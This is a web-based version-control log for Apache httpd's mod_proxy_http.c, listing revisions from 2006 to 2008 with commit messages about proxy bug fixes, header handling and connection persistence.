Revision [**645813**](/viewvc?view=revision&revision=645813) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=645813&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=645813&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=645813))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=645813)

Modified
*Tue Apr 8 09:49:13 2008 UTC*
(16 years, 9 months ago)
by *rpluem*

File length: 76080 byte(s)

Diff to [previous 617653](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=617653&r2=645813)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=617653&r2=645813&diff_format=h))
```
* In the case that we fail to read the response line from the backend and if
  we are a reverse proxy request shutdown the connection WITHOUT ANY response
  to trigger a retry by the client if allowed (as for idempotent requests).
  BUT currently we should not do this if the request is the first request on
  a keepalive connection as browsers like seamonkey only display an empty page
  in this case and do not do a retry.

Related to PR 37770

```

---

Revision [**617653**](/viewvc?view=revision&revision=617653) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=617653&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=617653&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=617653))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=617653)

Modified
*Fri Feb 1 21:21:01 2008 UTC*
(16 years, 11 months ago)
by *rpluem*

File length: 74371 byte(s)

Diff to [previous 616517](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=616517&r2=617653)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=616517&r2=617653&diff_format=h))
```
* Fix comment. No functional change.

```

---

Revision [**616517**](/viewvc?view=revision&revision=616517) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=616517&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=616517&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=616517))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=616517)

Modified
*Tue Jan 29 20:55:38 2008 UTC*
(17 years ago)
by *rpluem*

File length: 74371 byte(s)

Diff to [previous 611292](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=611292&r2=616517)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=611292&r2=616517&diff_format=h))
```
* Fix processing of chunked responses if Connection: Transfer-Encoding is
  set in the response of the proxied system.

PR: 44311

```

---

Revision [**611292**](/viewvc?view=revision&revision=611292) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=611292&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=611292&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=611292))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=611292)

Modified
*Fri Jan 11 20:30:23 2008 UTC*
(17 years ago)
by *covener*

File length: 73733 byte(s)

Diff to [previous 602542](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=602542&r2=611292)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=602542&r2=611292&diff_format=h))
```
  *) mod_proxy_http: Return HTTP status codes instead of apr_status_t
     values for errors encountered while forwarding the request body
     PR 44165 [Eric Covener]

See also PR 31759 / [r448711](/viewvc?view=revision&revision=448711)

```

---

Revision [**602542**](/viewvc?view=revision&revision=602542) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=602542&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=602542&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=602542))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=602542)

Modified
*Sat Dec 8 20:10:29 2007 UTC*
(17 years, 1 month ago)
by *rpluem*

File length: 73401 byte(s)

Diff to [previous 588806](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=588806&r2=602542)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=588806&r2=602542&diff_format=h))
```
* Enable the proxy to keep connections persistent in the HTTPS case.

  Basicly the persistence is created by keeping the conn_rec structure
  created for our backend connection (whether http or https) in the connection
  pool. This required to adjust scoreboard.c in a way that its functions can
  properly deal with a NULL scoreboard handle by ignoring the call or returning
  an error code.

```

---

Revision [**588806**](/viewvc?view=revision&revision=588806) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=588806&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=588806&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=588806))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=588806)

Modified
*Fri Oct 26 23:56:06 2007 UTC*
(17 years, 3 months ago)
by *niq*

File length: 73619 byte(s)

Diff to [previous 588791](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=588791&r2=588806)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=588791&r2=588806&diff_format=h))
```
Add option not to send&clear response headers in ap_send_interim_response.
We'll need this option to fix PR#43711, and ap_send_interim_response
is fortunately too new an API to have made it into anything stable.

```

---

Revision [**588791**](/viewvc?view=revision&revision=588791) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=588791&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=588791&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=588791))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=588791)

Modified
*Fri Oct 26 23:07:22 2007 UTC*
(17 years, 3 months ago)
by *niq*

File length: 73616 byte(s)

Diff to [previous 583813](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=583813&r2=588791)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=583813&r2=588791&diff_format=h))
```
mod_proxy: add "nocanon" keyword to ProxyPass, to suppress
URI-canonicalisation in a reverse proxy.
PR 41798

```

---

Revision [**583813**](/viewvc?view=revision&revision=583813) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=583813&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=583813&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=583813))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=583813)

Modified
*Thu Oct 11 13:02:35 2007 UTC*
(17 years, 3 months ago)
by *jorton*

File length: 73426 byte(s)

Diff to [previous 583803](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=583803&r2=583813)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=583803&r2=583813&diff_format=h))
```
* modules/proxy/mod_proxy_http.c (ap_proxy_http_register_hook): Fix
  apr_pool_cleanup_register() invocation added in [r583202](/viewvc?view=revision&revision=583202), which was
  causing every apr_proc_create() call to segfault.

```

---

Revision [**583803**](/viewvc?view=revision&revision=583803) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=583803&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=583803&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=583803))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=583803)

Modified
*Thu Oct 11 12:38:14 2007 UTC*
(17 years, 3 months ago)
by *jim*

File length: 73409 byte(s)

Diff to [previous 583466](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=583466&r2=583803)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=583466&r2=583803&diff_format=h))
```
(forward) proxy should not be verifying/checking for
valid chars in a URI... pass through.

```

---

Revision [**583466**](/viewvc?view=revision&revision=583466) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=583466&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=583466&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=583466))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=583466)

Modified
*Wed Oct 10 13:16:56 2007 UTC*
(17 years, 3 months ago)
by *jim*

File length: 73517 byte(s)

Diff to [previous 583205](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=583205&r2=583466)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=583205&r2=583466&diff_format=h))
```
Abstract out "verification of valid encoding" via
ap_proxy_isvalidenc(). Now we can use it in other
proxy protocols.

```

---

Revision [**583205**](/viewvc?view=revision&revision=583205) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=583205&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=583205&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=583205))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=583205)

Modified
*Tue Oct 9 15:59:32 2007 UTC*
(17 years, 3 months ago)
by *niq*

File length: 73950 byte(s)

Diff to [previous 583002](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=583002&r2=583205)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=583002&r2=583205&diff_format=h))
```
missing include!

```

---

Revision [**583002**](/viewvc?view=revision&revision=583002) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=583002&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=583002&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=583002))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=583002)

Modified
*Mon Oct 8 23:47:35 2007 UTC*
(17 years, 3 months ago)
by *niq*

File length: 73928 byte(s)

Diff to [previous 582655](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=582655&r2=583002)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=582655&r2=583002&diff_format=h))
```
mod_proxy_http: Don't unescape/escape forward proxied URLs.  Just check them.
PR 42592

also add fix to PR42572 to CHANGES (from [r563487](/viewvc?view=revision&revision=563487)/[r563489](/viewvc?view=revision&revision=563489))

```

---

Revision [**582655**](/viewvc?view=revision&revision=582655) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=582655&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=582655&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=582655))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=582655)

Modified
*Sun Oct 7 17:29:40 2007 UTC*
(17 years, 3 months ago)
by *niq*

File length: 73011 byte(s)

Diff to [previous 582631](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=582631&r2=582655)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=582631&r2=582655&diff_format=h))
```
Purge tabs in [r582631](/viewvc?view=revision&revision=582631)

```

---

Revision [**582631**](/viewvc?view=revision&revision=582631) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=582631&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=582631&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=582631))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=582631)

Modified
*Sun Oct 7 13:43:26 2007 UTC*
(17 years, 3 months ago)
by *niq*

File length: 72857 byte(s)

Diff to [previous 581030](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=581030&r2=582631)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=581030&r2=582631&diff_format=h))
```
mod_proxy_http: Correctly forward unexpected interim (HTTP 1xx) responses.
PR 16518

```

---

Revision [**581030**](/viewvc?view=revision&revision=581030) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=581030&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=581030&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=581030))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=581030)

Modified
*Mon Oct 1 18:08:13 2007 UTC*
(17 years, 3 months ago)
by *niq*

File length: 71842 byte(s)

Diff to [previous 580782](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580782&r2=581030)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580782&r2=581030&diff_format=h))
```
No change, but they won't let me have foo
(and ... this is the module with a function addit_dammit !!!)

```

---

Revision [**580782**](/viewvc?view=revision&revision=580782) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580782&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580782&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=580782))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=580782)

Modified
*Sun Sep 30 20:44:06 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 71762 byte(s)

Diff to [previous 580465](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580465&r2=580782)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580465&r2=580782&diff_format=h))
```
Proxy: remove Warning headers with wrong date
PR 16138

```

---

Revision [**580465**](/viewvc?view=revision&revision=580465) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580465&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580465&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=580465))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=580465)

Modified
*Fri Sep 28 19:23:27 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 69244 byte(s)

Diff to [previous 580457](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580457&r2=580465)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580457&r2=580465&diff_format=h))
```
Fix typo in header name "Trailer"

```

---

Revision [**580457**](/viewvc?view=revision&revision=580457) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580457&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580457&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=580457))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=580457)

Modified
*Fri Sep 28 18:50:57 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 69245 byte(s)

Diff to [previous 580060](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580060&r2=580457)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580060&r2=580457&diff_format=h))
```
Fix processing of Connection headers in proxy
PR 43509

```

---

Revision [**580060**](/viewvc?view=revision&revision=580060) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580060&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580060&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=580060))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=580060)

Modified
*Thu Sep 27 15:21:12 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 68947 byte(s)

Diff to [previous 580044](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580044&r2=580060)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580044&r2=580060&diff_format=h))
```
Fix adding out Via header in proxy response
PR 19439

```

---

Revision [**580044**](/viewvc?view=revision&revision=580044) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580044&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580044&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=580044))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=580044)

Modified
*Thu Sep 27 14:53:40 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 68951 byte(s)

Diff to [previous 580019](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580019&r2=580044)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=580019&r2=580044&diff_format=h))
```
Strip hop-by-hop headers in proxy response

```

---

Revision [**580019**](/viewvc?view=revision&revision=580019) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580019&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=580019&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=580019))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=580019)

Modified
*Thu Sep 27 14:20:21 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 68640 byte(s)

Diff to [previous 577349](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=577349&r2=580019)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=577349&r2=580019&diff_format=h))
```
Formatting.  No functional change.

```

---

Revision [**577349**](/viewvc?view=revision&revision=577349) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=577349&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=577349&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=577349))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=577349)

Modified
*Wed Sep 19 16:40:26 2007 UTC*
(17 years, 4 months ago)
by *jfclere*

File length: 68635 byte(s)

Diff to [previous 574021](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=574021&r2=577349)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=574021&r2=577349&diff_format=h))
```
Remove tabs.

```

---

Revision [**574021**](/viewvc?view=revision&revision=574021) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=574021&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=574021&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=574021))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=574021)

Modified
*Sun Sep 9 15:38:08 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 68586 byte(s)

Diff to [previous 572000](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=572000&r2=574021)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=572000&r2=574021&diff_format=h))
```
Propagate Proxy-Authorization header correctly
PR 25947
RFC2616 tells us:
  (1) If we haven't authenticated, we must pass the header on.
  (2) If we have authenticated, we MAY pass it on.
I've made the latter case configurable by ENV(Proxy-Chain-Auth).

Also, Proxy-Authenticate is a response header, and doesn't belong
in a check of request headers.

```

---

Revision [**572000**](/viewvc?view=revision&revision=572000) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=572000&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=572000&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=572000))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=572000)

Modified
*Sun Sep 2 15:10:29 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 68755 byte(s)

Diff to [previous 571002](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=571002&r2=572000)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=571002&r2=572000&diff_format=h))
```
Fix proxy-sendchunk(s|ed) problem
PR 43183

```

---

Revision [**571002**](/viewvc?view=revision&revision=571002) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=571002&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=571002&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=571002))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=571002)

Modified
*Thu Aug 30 00:44:24 2007 UTC*
(17 years, 5 months ago)
by *niq*

File length: 68598 byte(s)

Diff to [previous 561778](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=561778&r2=571002)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=561778&r2=571002&diff_format=h))
```
proxy_http: don't wait for response body in a HEAD
PR 41644 [Stuart Children]

```

---

Revision [**561778**](/viewvc?view=revision&revision=561778) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=561778&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=561778&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=561778))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=561778)

Modified
*Wed Aug 1 12:20:34 2007 UTC*
(17 years, 5 months ago)
by *jfclere*

File length: 68540 byte(s)

Diff to [previous 549420](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=549420&r2=561778)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=549420&r2=561778&diff_format=h))
```
create the brigate outside ap_proxygetline and reuse it.
correct the overflow handling. (returning APR_ENOSPC was
changing the behaviour).

```

---

Revision [**549420**](/viewvc?view=revision&revision=549420) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=549420&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=549420&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=549420))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=549420)

Modified
*Thu Jun 21 08:01:30 2007 UTC*
(17 years, 7 months ago)
by *jfclere*

File length: 68493 byte(s)

Diff to [previous 527969](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=527969&r2=549420)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=527969&r2=549420&diff_format=h))
```
Improve traces in ap_proxy_http_process_response().
That will help to investigate PR 37770. (errors from backend :-)).

```

---

Revision [**527969**](/viewvc?view=revision&revision=527969) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=527969&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=527969&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=527969))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=527969)

Modified
*Thu Apr 12 15:07:11 2007 UTC*
(17 years, 9 months ago)
by *trawick*

File length: 67950 byte(s)

Diff to [previous 495808](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=495808&r2=527969)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=495808&r2=527969&diff_format=h))
```
HTTP proxy ProxyErrorOverride: Leave 1xx and 3xx responses alone.  Only
processing of error responses (4xx, 5xx) will be altered.

PR: 39245

This is based on a patch submitted by Bart van der Schans <schans hippo.nl>
and tweaked slightly by me based on discussions on dev@ since April 2006.
I think rpleum was the first to mention the 1xx issue.

```

---

Revision [**495808**](/viewvc?view=revision&revision=495808) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=495808&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=495808&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=495808))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=495808)

Modified
*Sat Jan 13 01:02:46 2007 UTC*
(18 years ago)
by *jerenkrantz*

File length: 67952 byte(s)

Diff to [previous 486320](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=486320&r2=495808)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=486320&r2=495808&diff_format=h))
```
Re-add "proxy-sendextracrlf" first introduced in [r157478](/viewvc?view=revision&revision=157478) and silently removed
in [r219224](/viewvc?view=revision&revision=219224).

```

---

Revision [**486320**](/viewvc?view=revision&revision=486320) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=486320&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=486320&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=486320))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=486320)

Modified
*Tue Dec 12 21:22:36 2006 UTC*
(18 years, 1 month ago)
by *rpluem*

File length: 67349 byte(s)

Diff to [previous 437768](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=437768&r2=486320)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=437768&r2=486320&diff_format=h))
```
* Handle request bodies larger than 2 GB by converting the Content-Length
  header string of the request correctly to apr_off_t.

PR: 40883

```

---

Revision [**437768**](/viewvc?view=revision&revision=437768) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=437768&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=437768&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=437768))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=437768)

Modified
*Mon Aug 28 17:57:24 2006 UTC*
(18 years, 5 months ago)
by *jim*

File length: 67215 byte(s)

Diff to [previous 427959](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=427959&r2=437768)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=427959&r2=437768&diff_format=h))
```
Minor nit: why make the logic more complex than it needs to
be ? :)

```

---

Revision [**427959**](/viewvc?view=revision&revision=427959) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=427959&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=427959&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=427959))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=427959)

Modified
*Wed Aug 2 12:03:42 2006 UTC*
